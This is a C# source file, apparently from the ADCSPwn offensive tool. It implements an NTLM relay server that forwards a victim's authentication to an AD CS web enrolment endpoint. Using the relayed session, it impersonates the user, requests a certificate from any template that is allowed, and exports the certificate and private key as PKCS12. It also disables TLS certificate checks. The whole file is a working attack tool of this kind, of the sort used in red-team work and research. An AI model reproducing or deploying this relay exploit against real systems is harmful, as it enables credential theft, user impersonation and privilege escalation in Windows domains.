using System;
using System.Net;
using System.Text;
using System.Net.Sockets;
using System.Threading;
using System.Net.NetworkInformation;
using System.IO;
using System.Collections;
using System.Collections.Generic;
using System.Linq;
using System.Security.Cryptography;
using System.Text.RegularExpressions;

using Org.BouncyCastle.Asn1;
using Org.BouncyCastle.Pkcs;
using Org.BouncyCastle.X509;
using Org.BouncyCastle.Crypto;
using Org.BouncyCastle.OpenSsl;
using Org.BouncyCastle.Security;
using Org.BouncyCastle.Asn1.X509;
using Org.BouncyCastle.Asn1.Pkcs;
using Org.BouncyCastle.Crypto.Prng;
using Org.BouncyCastle.Crypto.Generators;

namespace ADCSPwn
{
    class RelayServer
    {
        private TcpListener _listener;
        public String[] CertificateTemplates;
        public bool DieOnNextRun;

        public void Initialize(String[] Templates)
        {
            CertificateTemplates = Templates;

            Console.WriteLine("[i] Set ADCS web service as: " + Config.adcs);

            _listener = new TcpListener(System.Net.IPAddress.Any, Config.port);
            _listener.Start();

            ThreadPool.QueueUserWorkItem(this.ListenerWorker, null);
        }

        public static void InitiateSSLTrust()
        {
            try
            {
                //Change SSL checks so that all checks pass
                ServicePointManager
    .ServerCertificateValidationCallback +=
    (sender, cert, chain, sslPolicyErrors) => true;
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex);
            }
        }

        private void ListenerWorker(object token)
        {
            while (_listener != null)
            {
                if (DieOnNextRun)
                {
                    System.Environment.Exit(1);
                }
                try
                {
                    var client = _listener.AcceptTcpClient();
                    ThreadPool.QueueUserWorkItem(this.HandleClientWorker, client);
                }
                catch (Exception e)
                {
                    Console.WriteLine("[!] Exception occurred:");
                    Console.WriteLine(e.Message);
                }
            }
        }

        private void HandleClientWorker(object token)
        {
            if (DieOnNextRun)
            {
                System.Environment.Exit(1);
            }
            try
            {
                var client = token as TcpClient;
                var stream = client.GetStream();

                using (var reader = new StreamReader(stream))
                {
                    var writer = new StreamWriter(stream);
                    var requestFinished = 0;
                    var method = "";
                    var uri = "";
                    var httpver = "";
                    var state = 0;

                    var headers = new Dictionary<string, string>();

                    while (requestFinished == 0)
                    {
                        if (state == 0)
                        {
                            var lineInput = reader.ReadLine();
                            var line = lineInput.Split(' ');
                            method = line[0];
                            uri = line[1];
                            httpver = line[2];
                            state = 1;
                        }
                        else
                        {
                            var lineInput = reader.ReadLine();
                            if (lineInput == "")
                            {
                                requestFinished = 1;
                                var body = "";
                                var response = HandleWebRequest(method, uri, httpver, headers, body, client);

                                writer.Write(response);
                                writer.Flush();
                                client.Close();
                            }
                            else
                            {
                                string[] line = lineInput.Split(':');
                                headers.Add(line[0].Trim().ToLower(), line[1].TrimStart());
                            }
                        }
                    }
                }
            }
            catch (Exception e)
            {
                Console.WriteLine("[*] Exception occurred:");
                Console.WriteLine(e.Message);
            }
        }

        public static HttpWebResponse SendWebRequest(string url, string method, string payload, string auth_header, string header_val)
        {
            InitiateSSLTrust();
            HttpWebRequest HttpReq = (HttpWebRequest)WebRequest.Create(url);
            HttpWebResponse HttpResp = null;

            try
            {
                HttpReq.Method = method;
                HttpReq.UserAgent = "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko";

                if (method == "POST")
                {
                    HttpReq.ContentType = "application/x-www-form-urlencoded";
                    HttpReq.ContentLength = payload.Length;
                }

                if (auth_header.Length != 0)
                {
                    if (auth_header == "Authorization")
                    {
                        header_val = "NTLM " + header_val;
                    }

                    HttpReq.Headers.Add(auth_header, header_val);
                }

                if (method == "POST")
                {
                    byte[] payload_bytes = Encoding.UTF8.GetBytes(payload);

                    Stream ReqStream = HttpReq.GetRequestStream();
                    ReqStream.Write(payload_bytes, 0, payload_bytes.Length);
                    ReqStream.Close();
                }

                HttpResp = (HttpWebResponse)HttpReq.GetResponse();
            }
            catch (WebException e)
            {
                HttpResp = (HttpWebResponse)e.Response;
            }

            return HttpResp;
        }

        private string HandleWebRequest(string method, string uri, string httpVersion, Dictionary<string, string> headers, string body, TcpClient client)
        {
            if (headers.ContainsKey("authorization") == false)
            {
                return "HTTP/1.0 401 Unauthorized\r\nServer: Microsoft-IIS/6.0\r\nContent-Type: text/html\r\nWWW-Authenticate: NTLM\r\nX-Powered-By: ASP.NET\r\nConnection: Close\r\nContent-Length: 0\r\n\r\n";
            }

            else if (headers.ContainsKey("authorization"))
            {

                Console.WriteLine("[+] Client ({0}) connected", ((IPEndPoint)client.Client.RemoteEndPoint).Address.ToString());

                var auth = headers["authorization"].Split();
                if (auth[0] == "NTLM")
                {
                    auth[1] = auth[1].TrimStart();
                    byte[] NTLMHash = System.Convert.FromBase64String(auth[1]);

                    // get the message type
                    var MsgType = BitConverter.ToInt16(NTLMHash, 8);

                    if (MsgType == 1)
                    {
                        // make the initial request without auth
                        Console.WriteLine("  |_ Attempting to access without authentication");
                        HttpWebResponse HttpResp;
                        if (Config.secure)
                        {
                            InitiateSSLTrust();
                            HttpResp = SendWebRequest("https://" + Config.adcs + "/certsrv/certfnsh.asp", "GET", "", "", "");
                        }
                        else
                        {
                            HttpResp = SendWebRequest("http://" + Config.adcs + "/certsrv/certfnsh.asp", "GET", "", "", "");
                        }
                        
                        

                        int StatusCode = (int)HttpResp.StatusCode;

                        if (StatusCode == 401)
                        {
                            Console.WriteLine("  | |_ ACCESS_DENIED (this is expected)");
                        }

                        else if (StatusCode == 200)
                        {
                            Console.WriteLine("  | |_ SUCCESS (does not appear to require authentication, exiting)");
                            System.Environment.Exit(1);
                        }

                        else
                        {
                            Console.WriteLine("  | |_ " + StatusCode + " (unexpected status code, continuing)");
                        }

                        // start the negotiation
                        Console.WriteLine("  |_ Attempting to authenticate");
                        Console.WriteLine("    |_ Relaying NTLMSSP_NEGOTIATE to target");
                        if (Config.secure)
                        {
                            InitiateSSLTrust();
                            HttpResp = SendWebRequest("https://" + Config.adcs + "/certsrv/certfnsh.asp", "GET", "", "Authorization", auth[1]);
                        }
                        else
                        {
                            HttpResp = SendWebRequest("http://" + Config.adcs + "/certsrv/certfnsh.asp", "GET", "", "Authorization", auth[1]);
                        }
                        HttpResp.Close();

                        // find the challenge
                        String challenge = "";
                        for (int i = 0; i < HttpResp.Headers.Count; i++)
                        {
                            if (HttpResp.Headers.GetKey(i) == "WWW-Authenticate")
                            {
                                challenge = HttpResp.Headers.Get(i).ToString();
                            }
                        }

                        // make sure we found it
                        if (challenge.Length == 0)
                        {
                            Console.WriteLine("Failed to find challenge... exiting");
                            System.Environment.Exit(1);
                        }

                        // store the challenge
                        challenge = challenge.Split()[1].TrimStart();

                        // build the responce to the client whos auth we are relaying, giving them the ntlm challenge we have just been given
                        String resp = "";

                        resp += "HTTP/1.1 401 Unauthorized\r\nServer: Microsoft-IIS/6.0\r\nContent-Type: text/html\r\nWWW-Authenticate: NTLM ";
                        resp += challenge;
                        resp += "\r\nConnection: Close\r\nContent-Length: 0\r\n\r\n";

                        Console.WriteLine("    |_ Relaying NTLMSSP_CHALLENGE to client");

                        // give them the challenge
                        return resp;

                    }

                    else if (MsgType == 3)
                    {

                        var Domain_len = BitConverter.ToInt16(NTLMHash, 28);
                        var Domain_offset = BitConverter.ToInt16(NTLMHash, 32);
                        var Domain = NTLMHash.Skip(Domain_offset).Take(Domain_len).ToArray();

                        var User_len = BitConverter.ToInt16(NTLMHash, 36);
                        var User_offset = BitConverter.ToInt16(NTLMHash, 40);
                        var User = NTLMHash.Skip(User_offset).Take(User_len).ToArray();

                        Console.WriteLine("  |_ Impersonating: " + System.Text.Encoding.Unicode.GetString(Domain) + "\\" + System.Text.Encoding.Unicode.GetString(User));
                        HttpWebResponse HttpResp;
                        if (Config.secure)
                        {
                            InitiateSSLTrust();
                            // send the challenge responce
                            HttpResp = SendWebRequest("https://" + Config.adcs + "/certsrv/certfnsh.asp", "GET", "", "Authorization", auth[1]);
                        }
                        else
                        {
                            HttpResp = SendWebRequest("http://" + Config.adcs + "/certsrv/certfnsh.asp", "GET", "", "Authorization", auth[1]);
                        }
                        

                        Console.WriteLine("  | |_ Relaying NTLMSSP_AUTH to target");

                        int StatusCode = (int)HttpResp.StatusCode;

                        // authentication should be a success
                        if (StatusCode == 401)
                        {
                            Console.WriteLine("    |_ Authentication failed :sadrio:");
                            Stream receiveStream = HttpResp.GetResponseStream();
                            StreamReader readStream = new StreamReader(receiveStream, Encoding.UTF8);

                            Console.WriteLine(readStream.ReadToEnd());
                            HttpResp.Close();
                            readStream.Close();
                            System.Environment.Exit(1);
                        }

                        HttpResp.Close();

                        // get our cookie
                        String cookie = "";
                        for (int i = 0; i < HttpResp.Headers.Count; i++)
                        {
                            if (HttpResp.Headers.GetKey(i) == "Set-Cookie")
                            {
                                cookie = HttpResp.Headers.Get(i).ToString();
                            }
                        }
                        if (Config.secure)
                        {
                            InitiateSSLTrust();
                            // validate our cookie works
                            HttpResp = SendWebRequest("https://" + Config.adcs + "/certsrv/certfnsh.asp", "GET", "", "Cookie", cookie);
                        }
                        else
                        {
                            HttpResp = SendWebRequest("http://" + Config.adcs + "/certsrv/certfnsh.asp", "GET", "", "Cookie", cookie);
                        }
                        
                        HttpResp.Close();

                        StatusCode = (int)HttpResp.StatusCode;

                        if (StatusCode != 200)
                        {
                            Console.WriteLine("      |_ Authentication failed, but cookie was given? wtf");
                            System.Environment.Exit(1);
                        }
                        else
                        {
                            Console.WriteLine("  |   |_ SUCCESS");
                        }

                        Console.WriteLine("  |_ Generating CSR");

                        // generate a rsa public-private key pair
                        var random = new SecureRandom();
                        var keyGenerationParameters = new KeyGenerationParameters(random, 4096);

                        RsaKeyPairGenerator generator = new RsaKeyPairGenerator();
                        generator.Init(keyGenerationParameters);

                        var keyPair = generator.GenerateKeyPair();

                        // set the attributes of the cert
                        var cert_attribs = new Dictionary<DerObjectIdentifier, string>
                        {
                            { X509Name.CN, System.Text.Encoding.Unicode.GetString(Domain)+"\\"+System.Text.Encoding.Unicode.GetString(User) },
                        };

                        var subject = new X509Name(cert_attribs.Keys.ToList(), cert_attribs);

                        // generate the CSR
                        var pkcs10CertificationRequest = new Pkcs10CertificationRequest(PkcsObjectIdentifiers.Sha256WithRsaEncryption.Id, subject, keyPair.Public, null, keyPair.Private);
                        var csr = Convert.ToBase64String(pkcs10CertificationRequest.GetEncoded());

                        // correctly format the certificate
                        var formatted_csr = "";
                        formatted_csr += "-----BEGIN CERTIFICATE REQUEST-----";
                        formatted_csr += csr;
                        formatted_csr += "-----END CERTIFICATE REQUEST-----";
                        formatted_csr = formatted_csr.Replace("\n", "").Replace("+", "%2b").Replace(" ", "+");

                        Console.WriteLine("  | |_ DONE");
                        Console.WriteLine("  |_ Requesting a certificate");

                        Stream dataStream = null;
                        StreamReader reader = null;
                        bool found_template = false;
                        string responseFromServer = null;

                        for (int i = 0; i < CertificateTemplates.Length - 1; i++)
                        {
                            if (CertificateTemplates[i] != null)
                            {
                                // build the post request body
                                var data = "";
                                data += "Mode=newreq&CertRequest=";
                                data += formatted_csr;
                                data += "&CertAttrib=CertificateTemplate:";
                                data += CertificateTemplates[i];
                                data += "&TargetStoreFlags=0&SaveCert=yes&ThumbPrint=";

                                if (Config.secure)
                                {
                                    InitiateSSLTrust();
                                    // ask the CS to create the certificate
                                    HttpResp = SendWebRequest("https://" + Config.adcs + "/certsrv/certfnsh.asp", "POST", data, "Cookie", cookie);
                                }
                                else
                                {
                                    HttpResp = SendWebRequest("http://" + Config.adcs + "/certsrv/certfnsh.asp", "POST", data, "Cookie", cookie);
                                }
                                StatusCode = (int)HttpResp.StatusCode;

                                if (StatusCode == 200)
                                {
                                    dataStream = HttpResp.GetResponseStream();

                                    reader = new StreamReader(dataStream);
                                    responseFromServer = reader.ReadToEnd();

                                    if (responseFromServer.Contains("locDenied"))
                                    {
                                        HttpResp.Close();
                                        continue;
                                    }
                                    else
                                    {
                                        found_template = true;

                                        Console.WriteLine("  | |_ Found valid template: " + CertificateTemplates[i]);

                                        break;
                                    }
                                }
                                else
                                {
                                    HttpResp.Close();
                                }
                            }
                        }

                        if (!found_template)
                        {
                            Console.WriteLine("    |_ Unable to find any usable templates for the current user :sadrio:");
                            System.Environment.Exit(1);
                        }

                        // find the req id of the certificate
                        string pattern = @"location=""certnew.cer\?ReqID=(.*?)&";
                        Regex rgx = new Regex(pattern, RegexOptions.IgnoreCase);

                        string reqid = null;
                        var match = rgx.Match(responseFromServer);

                        reqid = match.Groups[1].ToString();

                        if (reqid.Length == 0)
                        {
                            Console.WriteLine("    |_ Failed to find the certificate request id... dumping all page content.");
                            Console.WriteLine(responseFromServer);
                            System.Environment.Exit(1);
                        }

                        HttpResp.Close();

                        Console.WriteLine("  | |_ SUCCESS (ReqID: " + reqid + ")");
                        Console.WriteLine("  |_ Downloading certificate");
                            if (Config.secure)
                            {
                                InitiateSSLTrust();
                                // download the created certificate
                                HttpResp = SendWebRequest("https://" + Config.adcs + "/certsrv/certnew.cer?ReqID=" + reqid, "GET", "", "Cookie", cookie);
                            }
                            else
                            {
                                // download the created certificate
                                HttpResp = SendWebRequest("http://" + Config.adcs + "/certsrv/certnew.cer?ReqID=" + reqid, "GET", "", "Cookie", cookie);
                            }
                        

                        string certificate = null;
                        using (dataStream = HttpResp.GetResponseStream())
                        {
                            reader = new StreamReader(dataStream);
                            certificate = reader.ReadToEnd();
                        }

                        HttpResp.Close();

                        Console.WriteLine("    |_ Exporting certificate & private key");

                        // bundle together certificate and the private key
                        var privatekey = new StringWriter();
                        var pemWriter = new PemWriter(privatekey);

                        pemWriter.WriteObject(keyPair.Private);
                        privatekey.Flush();
                        privatekey.Close();

                        var bundle = certificate + privatekey.ToString();

                        Console.WriteLine("    |_ Converting into PKCS12");


                        var b64_bundle = PKCS12.ConvertToPKCS12(bundle);

                        Console.WriteLine("      |_ SUCCESS\n\n");
                        if (string.IsNullOrEmpty(Config.outpath))
                        {
                            Console.WriteLine(b64_bundle);
                        }
                        else
                        {
                            try
                            {
                                File.WriteAllText(Config.outpath, b64_bundle);
                                Console.WriteLine($"[i] Base64 encoded certificate written to {Config.outpath}");
                            }
                            catch (Exception ex)
                            {

                                Console.WriteLine($"[!] Failed to write certificate to {Config.outpath}!");
                                Console.WriteLine(b64_bundle);
                            }

                        }



                        DieOnNextRun = true;

                        // return success so the client won't auth to us again
                        return "HTTP/1.1 200 OK\r\nContent-Type: text/html\r\nConnection: Close\r\nContent-Length: 11\r\n\r\nNot Found\r\n";
                    }
                }
            }

            return "HTTP/1.1 401 Unauthorized\r\nServer: Microsoft-IIS/6.0\r\nContent-Type: text/html\r\nWWW-Authenticate: NTLM TlRMTVNTUAACAAAABgAGADgAAAAFAomiESIzRFVmd4gAAAAAAAAAAIAAgAA+AAAABQLODgAAAA9TAE0AQgACAAYAUwBNAEIAAQAWAFMATQBCAC0AVABPAE8ATABLAEkAVAAEABIAcwBtAGIALgBsAG8AYwBhAGwAAwAoAHMAZQByAHYAZQByADIAMAAwADMALgBzAG0AYgAuAGwAbwBjAGEAbAAFABIAcwBtAGIALgBsAG8AYwBhAGwAAAAAAA==\r\nConnection: Close\r\nContent-Length: 0\r\n\r\n";
        }
    }
}
